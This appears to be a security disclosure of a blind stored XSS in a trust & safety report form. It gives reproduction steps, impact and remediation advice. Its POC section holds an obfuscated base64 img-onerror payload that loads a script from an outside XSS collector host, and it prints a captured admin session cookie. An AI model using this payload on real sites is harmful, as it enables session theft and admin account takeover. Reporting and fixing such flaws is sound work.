## Title
Blind XSS in Trust & Safety Report Submission Form - TrustDesk

## Description
**Affected URL:** https://trustdesk.pwnedbox.site/report.php (triggers on https://trustdesk.pwnedbox.site/admin/view.php?id=1)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the trust & safety report submission form on `trustdesk.pwnedbox.site`. Input submitted in the **What happened?** (Description) and **Evidence & context** fields is stored without HTML encoding and renders directly in the DOM when an administrator opens the report in the backend (`/admin/view.php`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://trustdesk.pwnedbox.site/report.php`, fill in the required fields, paste the Blind XSS payload into **What happened?** and **Evidence & context**, and submit the report.
2. Log in to the admin panel (`https://trustdesk.pwnedbox.site/admin/index.php`) and open the submitted report (`/admin/view.php?id=1`).
3. Observe the payload execute immediately in the **Description** and **Evidence / context** sections, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://trustdesk.pwnedbox.site/report.php` (`What happened?` and `Evidence & context` fields)

**Trigger Endpoint:** `https://trustdesk.pwnedbox.site/admin/view.php?id=1`

**Payload:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://trustdesk.pwnedbox.site/admin/view.php?id=1`
- **Referrer:** `https://trustdesk.pwnedbox.site/admin/index.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=2dfe1720876508e1ccb802fddb07cd72`

**Visual Evidence:**
- Trust & safety submission form on `trustdesk.pwnedbox.site/report.php` with the payload entered in the **What happened?** and **Evidence & context** fields.
  <img width="1112" height="960" alt="image" src="https://github.com/user-attachments/assets/9e838d8f-3407-4833-af03-7c4670981fbd" /><br><br>

- Admin report view (`/admin/view.php?id=1`) displaying the rendered broken image icons in the **Description** and **Evidence / context** sections where the script fired, alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1892" height="911" alt="image" src="https://github.com/user-attachments/assets/064b5c46-0253-4634-b5df-a20d288c50a7" /><br><br>

- Blind XSS collector report confirming execution on `/admin/view.php?id=1` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1540" height="1077" alt="image" src="https://github.com/user-attachments/assets/0069066a-beef-463d-9eb1-4f31e3480bfd" /><br>


## Impact
Because the payload executes automatically when an administrator reviews incoming trust & safety reports:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, update, or manage all submitted trust & safety reports, reporter details, and internal moderation notes.
- **Persistent Compromise:** Attackers can use the hijacked admin session to alter case statuses, send customer-facing responses as staff, or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied report fields before rendering them in `/admin/view.php` and `/admin/index.php`.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block inline event handlers like `onerror` and restrict external requests.
